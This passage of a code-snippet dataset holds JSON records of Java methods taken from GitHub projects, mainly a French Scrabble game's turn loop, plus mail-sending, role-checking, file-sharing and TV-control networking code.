scanner.nextLine();\n\n\t\t\t\t\tSystem.out.print(\"Quelle position? (x): \");\n\t\t\t\t\tint readXPos = Integer.parseInt(scanner.nextLine());\n\n\t\t\t\t\tSystem.out.print(\"Quelle position? (y): \");\n\t\t\t\t\tint readYPos = Integer.parseInt(scanner.nextLine());\n\n\t\t\t\t\tSystem.out.print(\"Horizontal (1) ou vertical (0)?: \");\n\t\t\t\t\tint readHorizontal = Integer.parseInt(scanner.nextLine());\n\n\t\t\t\t\tint[] motArray = new int[readWord.length()];\n\t\t\t\t\tfor (int i = 0; i < readWord.length(); ++i)\n\t\t\t\t\t\tmotArray[i] = (int) readWord.charAt(i);\n\n\t\t\t\t\tif (gameInstance.proceedWithAction(gameInstance.tourActuel(), motArray, readXPos, readYPos,\n\t\t\t\t\t\t\treadHorizontal == 1)) {\n\t\t\t\t\t\tSystem.out.print(\"\\n\\nMot ins\u00e9r\u00e9! F\u00e9licitations!! \");\n\t\t\t\t\t\tSystem.out.print(\"\\n\\nJoueur \" + gameInstance.tourActuel().verifierNom() + \" a un total de \"\n\t\t\t\t\t\t\t\t+ gameInstance.tourActuel().verifierScore() + \" points!\");\n\n\t\t\t\t\t\tif (gameInstance.asGagne()) {\n\t\t\t\t\t\t\tJoueur gagnant = gameInstance.pointsFin();\n\t\t\t\t\t\t\tif (gagnant.verifierNom() == \"Match Null\") {\n\t\t\t\t\t\t\t\t// La partie s'est termin\u00e9e par une \u00e9galit\u00e9 (les deux joueurs ont le m\u00eame nombre\n\t\t\t\t\t\t\t\t// de points)\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t === MATCH NULL ===\");\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t=== Le gagnant est \" + gagnant.verifierNom() + \"!!! ===\");\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\titerations = 5;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tgameInstance.suivantTour();\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\tStatut actuel!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t\titerations++;\n\t\t\t\t\t\t}\n\t\t\t\t\t} else {\n\t\t\t\t\t\tSystem.out.print(\"\\n\\n\u00c7a ne marchera pas ... \");\n\t\t\t\t\t\tSystem.out.print(\"\\nR\u00e9essayer ^^\");\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2: // Jetter lettres\n\t\t\t\t\tint listJetter[] = { 0, 0, 0, 0, 0, 0, 0 };\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\tStatut de la main du joueur\");\n\t\t\t\t\tgameInstance.montrerMainMultijoueur(gameInstance.tourActuel());\n\n\t\t\t\t\tSystem.out.print(\"\\n\\n Indiquez quelle lettre vous voulez jetter (avec index entre 1 et 7): \");\n\t\t\t\t\tint counter = 0;\n\t\t\t\t\tboolean finished = false;\n\n\t\t\t\t\twhile (counter <= 7 && !finished) {\n\t\t\t\t\t\tint indexJetter = Integer.parseInt(scanner.nextLine());\n\t\t\t\t\t\tif ((1 <= indexJetter) && (indexJetter <= 7)) {\n\t\t\t\t\t\t\tlistJetter[indexJetter - 1] = 1;\n\t\t\t\t\t\t\tcounter++;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tif (indexJetter == 0)\n\t\t\t\t\t\t\t\tfinished = true;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tSystem.out.print(\"\\n ERREUR: Je ne connais pas cette lettre... \");\n\t\t\t\t\t\t}\n\t\t\t\t\t\tSystem.out.print(\n\t\t\t\t\t\t\t\t\"\\n Avez-vous fini (0) ? ou voulez vous continuer de changer des letrres (avec index entre 1 et 7) ? \");\n\t\t\t\t\t}\n\n\t\t\t\t\tfor (int i = 0; i < listJetter.length; ++i) {\n\t\t\t\t\t\tif (listJetter[i] == 1)\n\t\t\t\t\t\t\tgameInstance.setNombreLettre(gameInstance.tourActuel().jeterLettre(i, gameInstance.getNombreLettre()));\n\t\t\t\t\t}\n\n\t\t\t\t\tgameInstance.suivantTour();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tSystem.out.print(\"\\n\\n Le joueur passe son tour... \");\n\t\t\t\t\tif (gameInstance.lettresRestant() == 0)\n\t\t\t\t\t\tgameInstance.tourActuel().incrementTourPasser();\n\n\t\t\t\t\tif (gameInstance.tourActuel().verifierTourPasser()\n\t\t\t\t\t\t\t&& gameInstance.adversaireActuel().verifierTourPasser()) {\n\t\t\t\t\t\t// There are no more letters and both players have nothing to play\n\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t=== There aren't more combinations available!!! ===\");\n\t\t\t\t\t\tif (gameInstance.tourActuel().verifierScore() == gameInstance.adversaireActuel()\n\t\t\t\t\t\t\t\t.verifierScore()) {\n\t\t\t\t\t\t\t// La partie s'est termin\u00e9e par une \u00e9galit\u00e9 (les deux joueurs ont le m\u00eame nombre\n\t\t\t\t\t\t\t// de points)\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t === MATCH NULL ===\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tJoueur gagnant = (gameInstance.tourActuel().verifierScore() > gameInstance\n\t\t\t\t\t\t\t\t\t.adversaireActuel().verifierScore()) ? gameInstance.tourActuel()\n\t\t\t\t\t\t\t\t\t\t\t: gameInstance.adversaireActuel();\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t=== Le gagnant est \" + gagnant.verifierNom() + \"!!! ===\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\t// D\u00e9clarez la fin du jeu\n\t\t\t\t\t\titerations = 5;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t// Le jeu n'a pas pris fin pour le moment, passez au tour suivant\n\t\t\t\t\t\tgameInstance.suivantTour();\n\t\t\t\t\t\titerations++;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase 4:\n\t\t\t\t\tSystem.out.print(\"\\n\\n Suggestion de mots \");\n\t\t\t\t\tpermutationSearch pS = new permutationSearch(dicoAnagram, dico, plat,\n\t\t\t\t\t\t\tgameInstance.tourActuel().verifierMain(), gameInstance.usedWords);\n\n\t\t\t\t\tSystem.out.println(pS.totalPossibleWords() + \" r\u00e9sultats trouv\u00e9s! \\n\");\n\n\t\t\t\t\tif (pS.totalPossibleWords() > 25) {\n\t\t\t\t\t\tSystem.out\n\t\t\t\t\t\t\t\t.println(\"Il y a plein de resulats, donc je vais montrer seulement les 25 meilleurs\\n\");\n\t\t\t\t\t\tfor (int i = 0; i < 25; ++i)\n\t\t\t\t\t\t\tSystem.out.println(\"Mots: \" + pS.possibleWord(i).verifierNom() + \" pour un total de \"\n\t\t\t\t\t\t\t\t\t+ pS.possibleWord(i).verifierPoints() + \" points! (PosX:\"\n\t\t\t\t\t\t\t\t\t+ pS.possibleWord(i).verifierX() + \"|PosY:\" + pS.possibleWord(i).verifierY() + \")\");\n\t\t\t\t\t} else {\n\t\t\t\t\t\tfor (int i = 0; i < pS.totalPossibleWords(); ++i)\n\t\t\t\t\t\t\tSystem.out.println(\"Mots: \" + pS.possibleWord(i).verifierNom() + \" pour un total de \"\n\t\t\t\t\t\t\t\t\t+ pS.possibleWord(i).verifierPoints() + \" points! (PosX:\"\n\t\t\t\t\t\t\t\t\t+ pS.possibleWord(i).verifierX() + \"|PosY:\" + pS.possibleWord(i).verifierY() + \")\");\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\n\t\t\t\tdefault:\n\t\t\t\t\tSystem.out.print(\"\\n ERREUR: Je ne connais pas cette mode... \");\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tSystem.out.println(\"\\n\\tL'ordi fait son action...\");\n\t\t\t\tswitch (gameInstance.completeIATurn()) {\n\t\t\t\tcase 1:\n\t\t\t\t\t// Tous les tours n\u00e9cessaires pour terminer le jeu sont pass\u00e9s, terminer le jeu\n\t\t\t\t\titerations = 5;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0:\n\t\t\t\t\t// IA a ins\u00e9r\u00e9 une lettre\n\t\t\t\t\tSystem.out.print(\"\\n\\nJoueur \" + gameInstance.tourActuel().verifierNom() + \" a un total de \"\n\t\t\t\t\t\t\t+ gameInstance.tourActuel().verifierScore() + \" points!\");\n\n\t\t\t\t\tif (gameInstance.asGagne()) {\n\t\t\t\t\t\tJoueur gagnant = gameInstance.pointsFin();\n\t\t\t\t\t\tif (gagnant.verifierNom() == \"Match Null\") {\n\t\t\t\t\t\t\t// La partie s'est termin\u00e9e par une \u00e9galit\u00e9 (les deux joueurs ont le m\u00eame nombre\n\t\t\t\t\t\t\t// de points)\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t === MATCH NULL ===\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t=== Le gagnant est \" + gagnant.verifierNom() + \"!!! ===\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\titerations = 5;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tgameInstance.suivantTour();\n\t\t\t\t\t\tSystem.out.print(\"\\n\\n\\tStatut actuel!\");\n\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\t\titerations++;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase -1:\n\t\t\t\t\t// IA ne peux pas ins\u00e9rer de lettre , IA \u00e9chang\u00e9 ses lettres\n\t\t\t\t\tSystem.out.print(\"\\n\\n L'IA a decider jetter ses lettres...\");\n\t\t\t\t\tgameInstance.suivantTour();\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\tStatut actuel!\");\n\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\titerations++;\n\t\t\t\t\tbreak;\n\t\t\t\tcase -2:\n\t\t\t\t\t// IA ne peut pas \u00e9changer ses lettres et a pass\u00e9 le tour sans rien faire de pertinent\n\t\t\t\t\tSystem.out.print(\"\\n\\n L'IA NEW MESSAGE THAT SAYS THAT THE IA CANT DO ANYTHING AT ALL...\");\n\t\t\t\t\tgameInstance.suivantTour();\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\tStatut actuel!\");\n\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + gameInstance.joueur.verifierNom() + \": \"\n\t\t\t\t\t\t\t+ gameInstance.joueur.verifierScore() + \" points!\");\n\t\t\t\t\tSystem.out.print(\"\\n\\t\\tIA: \" + gameInstance.ordi.verifierScore() + \" points!\");\n\t\t\t\t\titerations++;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t} while (iterations < 5);\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56645, "method_name": "getNombreLettre", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Integer>", "snippet": "\tpublic ArrayList<Integer> getNombreLettre() {\n\t\treturn nombreLettre;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56646, "method_name": "setNombreLettre", "class_name": "MatchIA", "params": ["ArrayList<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setNombreLettre(ArrayList<Integer> nombreLettre) {\n\t\tthis.nombreLettre = nombreLettre;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56647, "method_name": "main", "class_name": "MedicationApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(MedicationApplication.class, args);\n    }", "url": "https://raw.githubusercontent.com/WhiteFerrari666/Medication/develop/src/main/java/com/Medication/Medication/MedicationApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56648, "method_name": "commandLineRunner", "class_name": "MedicationApplication", "params": ["ApplicationContext"], "throws": null, "modifiers": ["public"], "return_type": "CommandLineRunner", "snippet": "    public CommandLineRunner commandLineRunner(ApplicationContext ctx) {\n        return args -> {\n\n            System.out.println(\"Let's inspect the beans provided by Spring Boot:\");\n\n            String[] beanNames = ctx.getBeanDefinitionNames();\n            Arrays.sort(beanNames);\n            for (String beanName : beanNames) {\n                System.out.println(beanName);\n            }\n\n        };\n    }", "url": "https://raw.githubusercontent.com/WhiteFerrari666/Medication/develop/src/main/java/com/Medication/Medication/MedicationApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56649, "method_name": "run", "class_name": "MessageSender", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        try {\n            final Setup setup = Setup.getSetup();\n\n            Config config = setup.getConfig(Config.class);\n            if (!config.getMailConfig().check()) {\n                log.error(\"Mail config is not configured!\");\n                return;\n            }\n\n            List<DispatchMessage> messageList = Collections.emptyList();\n\n            Connection conSlave = setup.getConnectionPool().getDBSlaveConnectionFromPool();\n            try {\n                messageList = new DispatchDAO(conSlave).messageUnsentList();\n            } finally {\n                SQLUtils.closeConnection(conSlave);\n            }\n\n            for (DispatchMessage message : messageList) {\n                List<String> accountList = Collections.emptyList();\n\n                conSlave = setup.getConnectionPool().getDBSlaveConnectionFromPool();\n                try {\n                    accountList = new DispatchDAO(conSlave).messageAccountList(message.getId());\n                } finally {\n                    SQLUtils.closeConnection(conSlave);\n                }\n                \n                if (log.isDebugEnabled())\n                    log.debug(\"Found message to send: \" + message + \"; accounts count: \" + accountList.size());\n\n                String encoding = MailMsg.getParamMailEncoding(Setup.getSetup());\n                Session session = config.getMailConfig().getSmtpSession(Setup.getSetup());\n\n                Transport transport = null;\n\n                try {\n                    transport = session.getTransport();\n                    transport.connect();\n\n                    MimeMessage msg = new MimeMessage(session);\n                    msg.setFrom(new InternetAddress(config.getMailConfig().getFrom()));\n                    msg.setSubject(message.getTitle(), encoding);\n                    msg.setText(message.getText(), encoding);\n\n                    for (String account : accountList) {\n                        msg.setRecipients(RecipientType.TO, InternetAddress.parse(account));\n                        transport.sendMessage(msg, msg.getAllRecipients());\n                    }\n                } finally {\n                    if (transport != null) {\n                        transport.close();\n                    }\n                }\n\n                message.setSentTime(new Date());\n\n                Connection con = setup.getDBConnectionFromPool();\n                try {\n                    new DispatchDAO(con).messageUpdate(message);\n                    con.commit();\n                } finally {\n                    SQLUtils.closeConnection(con);\n                }\n            }\n\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/dispatch/MessageSender.java", "stars": "12", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 56650, "method_name": "main", "class_name": "CountCode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        int res = countCode(\"aaacodebbb\");\n        //System.out.println(res);\n        \n        System.out.println(countLetter(\"abcdasda\"));\n    }", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day18/CountCode.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56651, "method_name": "countCode", "class_name": "CountCode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int countCode(String str) {\n        int count = 0;\n\n        for(int i = 0; i < str.length() - 3; i++) {\n        \tchar letterOne = str.charAt(i);\n        \tchar letterTwo = str.charAt(i + 1);\n        \tchar letterFour = str.charAt(i + 3);\n        \t\n        \tif(letterOne == 'c' && letterTwo == 'o' && letterFour == 'e') {\n        \t\tcount++;\n        \t}\n        }\n        \n    \treturn count;\n    }", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day18/CountCode.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56652, "method_name": "countLetter", "class_name": "CountCode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int countLetter(String str) {\n    \tint count = 0;\n    \t\n        for(int i = 0; i < str.length(); i++) {\n        \t\n        \tSystem.out.println(str.charAt(i));\n        \t\n        \tif(str.charAt(i) == 'a') {\n        \t\tcount++;\n        \t}\n        }\n        \n        return count;\n    }", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day18/CountCode.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56653, "method_name": "contains", "class_name": "Dictionnaire", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean contains(String value) {\n\t\treturn this.get(value) != null;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Dictionnaire.java", "stars": "4", "class_props": {"extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"id": 56654, "method_name": "main", "class_name": "Dictionnaire", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws IOException {\n\t\tDictionnaire dico = new Dictionnaire(\"dico.txt\");\n\t\tSystem.out.println(dico.contains(\"abaissait\"));\n\t\tSystem.out.println(dico.contains(\"boi\"));\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Dictionnaire.java", "stars": "4", "class_props": {"extends": "HashMap", "implements": null, "modifiers": ["public"]}}, {"id": 56655, "method_name": "preHandle", "class_name": "UserRoleInterceptor", "params": ["HttpServletRequest", "HttpServletResponse", "Object"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        if(conf.enable()){\n            boolean check = true;\n            if(handler instanceof HandlerMethod){\n                HandlerMethod handlerMethod = (HandlerMethod) handler;\n                UserInfo userInfo = null;\n                if(handlerMethod.getMethod().isAnnotationPresent(RequireRoles.class)){\n                    userInfo = userInfoService.selectByUsername(security.getUserName(request));\n                    check = checkIfMatchRole(handlerMethod.\n                            getMethod().getAnnotation(RequireRoles.class), userInfo);\n                }\n                if(check && handlerMethod.getBeanType().isAnnotationPresent(RequireRoles.class)){\n                    if(null == userInfo){\n                        userInfo = userInfoService.selectByUsername(security.getUserName(request));\n                    }\n                    check = checkIfMatchRole(handlerMethod.getBeanType()\n                            .getAnnotation(RequireRoles.class), userInfo);\n                }\n            }\n            if(!check){\n                response.setStatus(HttpStatus.UNAUTHORIZED.value());\n            }\n            return check;\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/auth/interceptors/UserRoleInterceptor.java", "stars": "23", "class_props": {"extends": null, "implements": ["HandlerInterceptor"], "modifiers": ["public"]}}, {"id": 56656, "method_name": "checkIfMatchRole", "class_name": "UserRoleInterceptor", "params": ["RequireRoles", "UserInfo"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean checkIfMatchRole(RequireRoles roles, UserInfo userInfo){\n        UserRole[] userRoles = roles.value();\n        Integer typeValue = userInfo.getUserType();\n        if(null != typeValue){\n            for(UserRole userRole : userRoles){\n                if(typeValue <  userRole.getValue()){\n                    return false;\n                }\n            }\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/auth/interceptors/UserRoleInterceptor.java", "stars": "23", "class_props": {"extends": null, "implements": ["HandlerInterceptor"], "modifiers": ["public"]}}, {"id": 56657, "method_name": "run", "class_name": "ServerFileUploader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        try {\n\n            //Wait for client to be ready\n            Thread.sleep(1000);\n\n            Socket uploadTo = new Socket(client.getIP(), client.getServer().getMAIN_PORT() + 2);\n\n            File file = new File(Utils.rebuildPath(\n                    String.format(\"%s\\\\DownloadedFiles\\\\%s\\\\%s\",\n                            System.getProperty(\"user.dir\"),\n                            message.getSender(),\n                            message.getBody())\n            ));\n\n            DataOutputStream toClient = new DataOutputStream(uploadTo.getOutputStream());\n\n            if (file.exists()) {\n\n                logger.debug(String.format(\"Start uploading %s\", file.getName()));\n\n                if (!file.canRead())\n                    logger.error(\"File is not readable :)\");\n\n                RandomAccessFile randomAccessFile = new RandomAccessFile(file, \"r\");\n\n                byte[] buffer = new byte[BUFFER_SIZE];\n\n                while (randomAccessFile.read(buffer) != -1)\n                    toClient.write(buffer);\n\n                randomAccessFile.close();\n\n                logger.debug(String.format(\"%s uploaded successfully!\", file.getName()));\n\n            } else {\n                logger.debug(String.format(\"%s doesn't exists :)\", file.getName()));\n                logger.debug(file.getAbsolutePath());\n                client.sendMessageToClient(ServerMessageBuilder\n                        .responseBuilder(FILE_REMOVED, String.format(\"%s doesn't exists :)\", file.getName())));\n            }\n\n        } catch (IOException | SendingToClientWasFailed | InterruptedException e) {\n            logger.error(e.getMessage());\n        } finally {\n            serverWorker.decreaseUploadInProgress();\n        }\n    }", "url": "https://raw.githubusercontent.com/AlirezaAZ/SimpleChatroom/master/src/Server/FileSharing/ServerFileUploader.java", "stars": "2", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 56658, "method_name": "start", "class_name": "NetcastHttpServer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() {\n        //TODO: this method is too complex and should be refactored\n        if (running)\n            return;\n\n        running = true;\n\n        try {\n            welcomeSocket = new ServerSocket(this.port);\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n\n        while (running) {\n            if (welcomeSocket == null || welcomeSocket.isClosed()) {\n                stop();\n                break;\n            }\n\n            Socket connectionSocket = null;\n            BufferedReader inFromClient = null;\n            DataOutputStream outToClient = null;\n\n            try {\n                connectionSocket = welcomeSocket.accept();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n                // this socket may have been closed, so we'll stop\n                stop();\n                return;\n            }\n\n            String str = null;\n            int c;\n            StringBuilder sb = new StringBuilder();\n\n            try {\n                inFromClient = new BufferedReader(new InputStreamReader(connectionSocket.getInputStream()));\n\n                while ((str = inFromClient.readLine()) != null) {\n                    if (str.equals(\"\")) {\n                        break;\n                    }\n                }\n\n                while ((c = inFromClient.read()) != -1) {\n                    sb.append((char)c);\n                    String temp = sb.toString();\n\n                    if (temp.endsWith(\"</envelope>\"))\n                        break;\n                }\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n\n            String body = sb.toString();\n\n            Log.d(Util.T, \"got message body: \" + body);\n\n            Calendar calendar = Calendar.getInstance();\n            SimpleDateFormat dateFormat = new SimpleDateFormat(\"EEE, dd MMM yyyy HH:mm:ss z\", Locale.US);\n            dateFormat.setTimeZone(TimeZone.getTimeZone(\"GMT\"));\n            String date = dateFormat.format(calendar.getTime());\n            String androidOSVersion = android.os.Build.VERSION.RELEASE;\n\n            PrintWriter out = null;\n\n            try {\n                outToClient = new DataOutputStream(connectionSocket.getOutputStream());\n                out = new PrintWriter(outToClient);\n                out.println(\"HTTP/1.1 200 OK\");\n                out.println(\"Server: Android/\" + androidOSVersion + \" UDAP/2.0 ConnectSDK/1.2.1\");\n                out.println(\"Cache-Control: no-store, no-cache, must-revalidate\");\n                out.println(\"Date: \" + date);\n                out.println(\"Connection: Close\");\n                out.println(\"Content-Length: 0\");\n                out.println();\n                out.flush();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            } finally {\n                try {\n                    inFromClient.close();\n                    out.close();\n                    outToClient.close();\n                    connectionSocket.close();\n                } catch (IOException ex) {\n                    ex.printStackTrace();\n                }\n            }\n\n            SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();\n            InputStream stream = null;\n\n            try {\n                stream = new ByteArrayInputStream(body.getBytes(\"UTF-8\"));\n            } catch (UnsupportedEncodingException ex) {\n                ex.printStackTrace();\n            }\n\n            NetcastPOSTRequestParser handler = new NetcastPOSTRequestParser();\n\n            SAXParser saxParser;\n            try {\n                saxParser = saxParserFactory.newSAXParser();\n                saxParser.parse(stream, handler);\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            } catch (ParserConfigurationException e) {\n                e.printStackTrace();\n            } catch (SAXException e) {\n                e.printStackTrace();\n            }\n\n            if (body.contains(\"ChannelChanged\")) {\n                ChannelInfo channel = NetcastChannelParser.parseRawChannelData(handler.getJSONObject());\n\n                Log.d(Util.T, \"Channel Changed: \" + channel.getNumber());\n\n                for (URLServiceSubscription<?> sub: subscriptions) {\n                    if (sub.getTarget().equalsIgnoreCase(\"ChannelChanged\")) {\n                        for (int i = 0; i < sub.getListeners().size(); i++) {\n                            @SuppressWarnings(\"unchecked\")\n                            ResponseListener<Object> listener = (ResponseListener<Object>) sub.getListeners().get(i);\n                            Util.postSuccess(listener, channel);\n                        }\n                    }\n                }\n            }\n            else if (body.contains(\"KeyboardVisible\")) {\n                boolean focused = false;\n\n                TextInputStatusInfo keyboard = new TextInputStatusInfo();\n                keyboard.setRawData(handler.getJSONObject());\n\n                try {\n                    JSONObject currentWidget = (JSONObject) handler.getJSONObject().get(\"currentWidget\");\n                    focused = (Boolean) currentWidget.get(\"focus\");\n                    keyboard.setFocused(focused);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n\n                Log.d(Util.T, \"KeyboardFocused?: \" + focused);\n\n                for (URLServiceSubscription<?> sub: subscriptions) {\n                    if (sub.getTarget().equalsIgnoreCase(\"KeyboardVisible\")) {\n                        for (int i = 0; i < sub.getListeners().size(); i++) {\n                            @SuppressWarnings(\"unchecked\")\n                            ResponseListener<Object> listener = (ResponseListener<Object>) sub.getListeners().get(i);\n                            Util.postSuccess(listener, keyboard);\n                        }\n                    }\n                }\n            }\n            else if (body.contains(\"TextEdited\")) {\n                